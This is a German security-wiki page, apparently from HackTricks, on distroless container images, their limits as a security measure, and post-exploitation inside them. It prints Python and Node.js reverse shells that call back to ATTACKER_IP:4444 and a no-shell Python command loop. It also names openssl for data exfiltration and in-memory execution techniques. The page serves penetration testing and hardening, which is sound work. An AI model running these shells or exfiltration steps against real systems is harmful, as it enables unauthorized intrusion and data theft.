# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Ein **distroless** Container-Image ist ein Image, das die **minimal erforderlichen Runtime-Komponenten zum Ausführen einer bestimmten Anwendung** enthält und gleichzeitig absichtlich die üblichen Distributionstools wie package managers, shells und große Mengen allgemeiner userland utilities entfernt. In der Praxis enthalten distroless Images häufig nur die Anwendungs-Binary oder Runtime, ihre shared libraries, certificate bundles und ein sehr kleines Filesystem-Layout.

Distroless ist keine neue Kernel-Isolationsprimitive. Distroless ist eine **Strategie für das Image-Design**. Sie verändert, was **innerhalb** des Container-Filesystems verfügbar ist, nicht jedoch, wie der Kernel den Container isoliert. Diese Unterscheidung ist wichtig, weil distroless die Umgebung hauptsächlich dadurch härtet, dass die Möglichkeiten reduziert werden, die ein Angreifer nach dem Erlangen von code execution nutzen kann. Es ersetzt weder namespaces, seccomp, capabilities, AppArmor, SELinux noch andere Runtime-Isolationsmechanismen.

## Warum Distroless Existiert

Distroless Images werden hauptsächlich verwendet, um Folgendes zu reduzieren:

- die Image-Größe
- die operative Komplexität des Images
- die Anzahl der Packages und Binaries, die Schwachstellen enthalten könnten
- die Anzahl der standardmäßig verfügbaren Post-Exploitation-Tools für einen Angreifer

Aus diesem Grund sind distroless Images bei Production-Application-Deployments beliebt. Ein Container, der keine shell, keinen package manager und kaum allgemeine Tools enthält, ist normalerweise operativ einfacher einzuschätzen und nach einem Compromise interaktiv schwieriger zu missbrauchen.

Beispiele für bekannte distroless-artige Image-Familien sind:

- Googles distroless Images
- Chainguard hardened/minimal Images

## Was Distroless Nicht Bedeutet

Ein distroless Container ist **nicht**:

- automatisch rootless
- automatisch non-privileged
- automatisch read-only
- automatisch durch seccomp, AppArmor oder SELinux geschützt
- automatisch vor einem Container Escape geschützt

Es ist weiterhin möglich, ein distroless Image mit `--privileged`, dem Teilen von Host-Namespaces, gefährlichen Bind-Mounts oder einem gemounteten Runtime-Socket auszuführen. In diesem Szenario kann das Image zwar minimal sein, der Container aber dennoch katastrophal unsicher. Distroless verändert die **Userland-Angriffsfläche**, nicht die **Kernel-Trust-Boundary**.

## Typische Operative Eigenschaften

Wenn du einen distroless Container compromittest, stellst du normalerweise zuerst fest, dass übliche Annahmen nicht mehr zutreffen. Es gibt möglicherweise kein `sh`, kein `bash`, kein `ls`, kein `id`, kein `cat` und manchmal nicht einmal eine libc-basierte Umgebung, die sich so verhält, wie es deine üblichen Tradecraft-Erwartungen voraussetzen. Das betrifft sowohl Offense als auch Defense, da der Mangel an Tools Debugging, Incident Response und Post-Exploitation verändert.

Die häufigsten Muster sind:

- die Application-Runtime ist vorhanden, aber kaum etwas anderes
- shell-basierte Payloads schlagen fehl, weil keine shell vorhanden ist
- übliche Enumeration-One-Liner schlagen fehl, weil die Helper-Binaries fehlen
- Filesystem-Schutzmaßnahmen wie read-only rootfs oder `noexec` auf beschreibbaren tmpfs-Verzeichnissen sind häufig ebenfalls vorhanden

Diese Kombination führt normalerweise dazu, dass von „weaponizing distroless“ gesprochen wird.

## Distroless und Post-Exploitation

Die zentrale offensive Herausforderung in einer distroless Umgebung ist nicht immer die initiale RCE. Häufig geht es darum, was danach kommt. Wenn der kompromittierte Workload code execution in einer Language-Runtime wie Python, Node.js, Java oder Go ermöglicht, kannst du möglicherweise beliebige Logik ausführen, jedoch nicht über die normalen shell-zentrierten Workflows, die bei anderen Linux-Zielen üblich sind.

Das bedeutet, dass sich die Post-Exploitation häufig in eine von drei Richtungen entwickelt:

1. **Die vorhandene Language-Runtime direkt verwenden**, um die Umgebung zu enumerieren, Sockets zu öffnen, Files zu lesen oder zusätzliche Payloads zu stagen.
2. **Eigene Tools in den Speicher laden**, wenn das Filesystem read-only ist oder beschreibbare Verzeichnisse mit `noexec` gemountet sind.
3. **Bereits im Image vorhandene Binaries missbrauchen**, wenn die Anwendung oder ihre Dependencies etwas unerwartet Nützliches enthalten.

## Abuse

### Die Bereits Vorhandene Runtime Enumerieren

In vielen distroless Containern gibt es keine shell, aber weiterhin eine Application-Runtime. Wenn das Ziel ein Python-Service ist, ist Python vorhanden. Wenn das Ziel Node.js ist, ist Node vorhanden. Das bietet häufig ausreichend Funktionalität, um Files zu enumerieren, Environment-Variablen zu lesen, Reverse Shells zu öffnen und In-Memory-Execution zu stagen, ohne jemals `/bin/sh` aufzurufen.

Ein einfaches Beispiel mit Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ein einfaches Beispiel mit Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Auswirkungen:

- Wiederherstellung von Umgebungsvariablen, die häufig Zugangsdaten oder Service-Endpunkte enthalten
- Dateisystem-Aufzählung ohne `/bin/ls`
- Identifizierung beschreibbarer Pfade und gemounteter Secrets

### Reverse Shell ohne `/bin/sh`

Wenn das Image weder `sh` noch `bash` enthält, kann eine klassische shell-basierte Reverse Shell sofort fehlschlagen. Verwende in diesem Fall stattdessen die installierte Language Runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Falls `/bin/sh` nicht vorhanden ist, ersetze die letzte Zeile durch eine direkte von Python gesteuerte Befehlsausführung oder eine Python-REPL-Schleife.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Wieder gilt: Wenn `/bin/sh` nicht vorhanden ist, verwende direkt die Dateisystem-, Prozess- und Netzwerk-APIs von Node, anstatt eine Shell zu starten.

### Vollständiges Beispiel: No-Shell Python Command Loop

Wenn das Image zwar Python, aber überhaupt keine Shell enthält, reicht eine einfache interaktive Schleife oft aus, um die vollständige post-exploitation-Funktionalität aufrechtzuerhalten:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Dies erfordert keine interaktive Shell-Binary. Die Auswirkungen sind aus Sicht des Angreifers praktisch identisch mit einer einfachen Shell: Befehlsausführung, Enumeration und das Staging weiterer Payloads über die vorhandene Runtime.

### Ausführung von In-Memory-Tools

Distroless-Images werden häufig kombiniert mit:

- `readOnlyRootFilesystem: true`
- beschreibbarem, aber `noexec`-geschütztem tmpfs wie `/dev/shm`
- fehlenden Tools zur Paketverwaltung

Diese Kombination macht klassische Workflows nach dem Muster „Binary auf die Festplatte herunterladen und ausführen“ unzuverlässig. In diesen Fällen werden Techniken zur Ausführung aus dem Speicher zur wichtigsten Lösung.

Die entsprechende Seite ist:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die relevantesten Techniken dort sind:

- `memfd_create` + `execve` über Scripting-Runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Bereits im Image vorhandene Binaries

Einige Distroless-Images enthalten weiterhin für den Betrieb notwendige Binaries, die nach einer Kompromittierung nützlich werden. Ein wiederholt beobachtetes Beispiel ist `openssl`, da Anwendungen es manchmal für kryptografische oder TLS-bezogene Aufgaben benötigen.

Ein schnelles Suchmuster ist:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Wenn `openssl` vorhanden ist, kann es möglicherweise für Folgendes verwendet werden:

- ausgehende TLS-Verbindungen
- Datenexfiltration über einen erlaubten Egress-Kanal
- Staging von Payload-Daten durch codierte/verschlüsselte Blobs

Der genaue Missbrauch hängt davon ab, was tatsächlich installiert ist. Die allgemeine Idee ist jedoch, dass distroless nicht „überhaupt keine Tools“ bedeutet, sondern „deutlich weniger Tools als ein normales Distribution-Image“.

## Prüfungen

Das Ziel dieser Prüfungen besteht darin festzustellen, ob das Image in der Praxis tatsächlich distroless ist und welche Laufzeit- oder Hilfs-Binaries noch für Post-Exploitation verfügbar sind.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Was hier interessant ist:

- Wenn keine Shell vorhanden ist, aber eine Runtime wie Python oder Node verfügbar ist, sollte die Post-Exploitation auf Runtime-gesteuerte Ausführung umschwenken.
- Wenn das Root-Dateisystem schreibgeschützt ist und `/dev/shm` beschreibbar, aber mit `noexec` eingebunden ist, werden Techniken zur Ausführung aus dem Speicher deutlich relevanter.
- Wenn Hilfsprogramme wie `openssl`, `busybox` oder `java` vorhanden sind, bieten sie möglicherweise genug Funktionalität, um weiteren Zugriff zu ermöglichen.

## Runtime-Standardeinstellungen

| Image- / Plattformstil | Standardzustand | Typisches Verhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Google distroless style images | Minimaler Userland ist beabsichtigt | Keine Shell, kein package manager, nur Anwendungs- und Runtime-Abhängigkeiten | Hinzufügen von Debugging-Layern und Sidecar-Shells, Kopieren von busybox oder anderen Tools |
| Chainguard minimal images | Minimaler Userland ist beabsichtigt | Reduzierte Paketoberfläche, häufig auf eine Runtime oder einen Service ausgerichtet | Verwendung von `:latest-dev` oder Debug-Varianten, Kopieren von Tools während des Builds |
| Kubernetes workloads using distroless images | Abhängig von der Pod-Konfiguration | Distroless betrifft nur das Userland; die Sicherheitslage des Pods hängt weiterhin von der Pod-Spezifikation und den Runtime-Standardeinstellungen ab | Hinzufügen temporärer Debug-Container, Host-Mounts, privilegierte Pod-Einstellungen |
| Docker / Podman running distroless images | Abhängig von den Run-Flags | Minimales Dateisystem, aber die Runtime-Sicherheit hängt weiterhin von Flags und der Daemon-Konfiguration ab | `--privileged`, gemeinsame Nutzung von Host-Namespaces, Runtime-Socket-Mounts, beschreibbare Host-Bind-Mounts |

Der entscheidende Punkt ist, dass distroless eine **Image-Eigenschaft** und kein Runtime-Schutz ist. Der Nutzen besteht darin, die nach einer Kompromittierung im Dateisystem verfügbaren Möglichkeiten zu reduzieren.

## Verwandte Seiten

Für Umgehungen von Dateisystem- und Speicherausführungsschutz, die in distroless-Umgebungen häufig benötigt werden:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Für den Missbrauch von Container-Runtime, Sockets und Mounts, der auch auf distroless Workloads anwendbar ist:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
